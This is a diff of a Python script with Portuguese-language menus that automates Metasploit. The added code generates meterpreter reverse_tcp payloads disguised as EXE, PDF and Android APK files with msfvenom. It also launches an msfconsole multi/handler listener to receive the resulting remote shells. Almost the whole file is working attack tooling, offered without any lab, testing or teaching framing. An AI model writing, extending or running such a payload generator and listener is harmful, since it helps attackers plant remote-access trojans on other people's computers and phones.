@@ -1,78 +1,121 @@
 import subprocess
+import socket
+import os
 
-def check_msfvenom_installed():
+def get_local_ip():
     try:
-        subprocess.run("msfvenom --version", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        return True
-    except subprocess.CalledProcessError:
-        return False
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(0.1)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except Exception:
+        return "127.0.0.1"
 
-def install_msfvenom():
+def list_msf4_modules():
+    msf4_dir = os.path.expanduser("~/.msf4/modules/")
+    if os.path.exists(msf4_dir):
+        print("Módulos disponíveis no diretório .msf4:")
+        module_list = []
+        for root, dirs, files in os.walk(msf4_dir):
+            for file in files:
+                if file.endswith(".rb"):
+                    module_list.append(os.path.join(root, file))
+        return module_list
+    else:
+        print("Diretório .msf4 não encontrado.")
+        return []
+
+def search_modules(query, module_list):
+    matching_modules = [module for module in module_list if query in module]
+    if matching_modules:
+        print("Módulos correspondentes:")
+        for module in matching_modules:
+            print(module)
+    else:
+        print("Nenhum módulo correspondente encontrado.")
+
+def generate_payload(payload_type, lhost, lport):
+    if payload_type == "exe":
+        print("Gerando payload para EXE...")
+        cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", "payload.exe"]
+        print("Comando usado para gerar o payload:")
+        print(" ".join(cmd))
+        try:
+            subprocess.call(cmd)
+            print("Payload gerado com sucesso.")
+        except Exception as e:
+            print(f"Erro ao gerar payload: {str(e)}")
+    elif payload_type == "pdf":
+        print("Gerando payload para PDF...")
+        cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "pdf", "-o", "payload.pdf"]
+        print("Comando usado para gerar o payload:")
+        print(" ".join(cmd))
+        try:
+            subprocess.call(cmd)
+            print("Payload gerado com sucesso.")
+        except Exception as e:
+            print(f"Erro ao gerar payload: {str(e)}")
+    elif payload_type == "apk":
+        print("Gerando payload para APK...")
+        cmd = ["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", "payload.apk"]
+        print("Comando usado para gerar o payload:")
+        print(" ".join(cmd))
+        try:
+            subprocess.call(cmd)
+            print("Payload gerado com sucesso.")
+        except Exception as e:
+            print(f"Erro ao gerar payload: {str(e)}")
+    else:
+        print("Tipo de payload não suportado.")
+
+def start_listener(lhost, lport):
+    print(f"Iniciando listener em {lhost}:{lport}...")
+    cmd = f"use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit"
+    print("Comando usado para iniciar o listener:")
+    print(cmd)
     try:
-        print("Iniciando a instalação do msfvenom...")
-        subprocess.run("apt-get install -y metasploit-framework", shell=True, check=True)
-        print("msfvenom foi instalado com sucesso!")
-        return True
-    except subprocess.CalledProcessError as e:
-        print(f"Erro ao instalar o msfvenom: {e}")
-        return False
-
-def check_veil_installed():
-    try:
-        subprocess.run("veil --version", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        return True
-    except subprocess.CalledProcessError:
-        return False
-
-def install_veil():
-    try:
-        print("Iniciando a instalação do Veil-Framework...")
-        subprocess.run("apt-get install -y git", shell=True, check=True)
-        subprocess.run("git clone https://github.com/Veil-Framework/Veil.git", shell=True, check=True)
-        subprocess.run("cd Veil && ./config/setup.sh --force --silent", shell=True, check=True)
-        print("Veil-Framework foi instalado com sucesso!")
-    except subprocess.CalledProcessError as e:
-        print(f"Erro ao instalar o Veil-Framework: {e}")
-
-# Defina outras funções necessárias aqui, como create_listener, generate_payload, etc.
+        subprocess.call(["msfconsole", "-q", "-x", cmd])
+    except Exception as e:
+        print(f"Erro ao iniciar o listener: {str(e)}")
 
 def main():
-    print("Bem-vindo ao gerador de payloads usando msfvenom!")
-
-    if not check_msfvenom_installed():
-        if not install_msfvenom():
-            print("Não foi possível instalar o msfvenom. O programa será encerrado.")
-            return
-
+    local_ip = get_local_ip()
+    print(f"Seu endereço IP local é: {local_ip}")
     while True:
-        print("\nMENU INICIAL:")
-        print("1. Abrir Listener")
-        print("2. Criar Exploits e Payloads")
-        print("3. Instalar Veil-Framework")
-        print("4. Atualizar Ferramentas")
-        print("0. Sair")
+        print("Bem-vindo ao seu script de geração de payload e listener.")
+        print("Selecione a opção desejada:")
+        print("1. Gerar payload")
+        print("2. Iniciar listener")
+        print("3. Listar módulos no .msf4")
+        print("4. Pesquisar módulos no .msf4")
+        print("5. Sair")
 
-        choice = input("Digite o número da opção desejada: ")
+        option = input("Escolha uma opção (1/2/3/4/5): ")
 
-        if choice == "1":
-            create_listener()
-        elif choice == "2":
-            # Implemente a lógica para criar payloads e exploits aqui.
-            pass
-        elif choice == "3":
-            if not check_veil_installed():
-                install_veil()
+        if option == "1":
+            payload_type = input("Escolha o tipo de payload (pdf/exe/apk): ")
+            lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
+            lport = input("Insira o LPORT: ")
+            generate_payload(payload_type, lhost, lport)
+        elif option == "2":
+            lhost = input(f"Insira o LHOST (padrão: {local_ip}): ") or local_ip
+            lport = input("Insira o LPORT: ")
+            start_listener(lhost, lport)
+        elif option == "3":
+            module_list = list_msf4_modules()
+        elif option == "4":
+            if "module_list" in locals():
+                query = input("Digite o nome do módulo que deseja pesquisar: ")
+                search_modules(query, module_list)
             else:
-                print("O Veil-Framework já está instalado.")
-        elif choice == "4":
-            # Implemente a lógica para atualizar ferramentas aqui.
-            pass
-        elif choice == "0":
-            print("Saindo...")
+                print("Primeiro liste os módulos no diretório .msf4 (opção 3).")
+        elif option == "5":
+            print("Encerrando o programa.")
             break
         else:
-            print("Opção inválida! Tente novamente.")
-            continue
+            print("Opção inválida. Tente novamente.")
 
 if __name__ == "__main__":
     main()
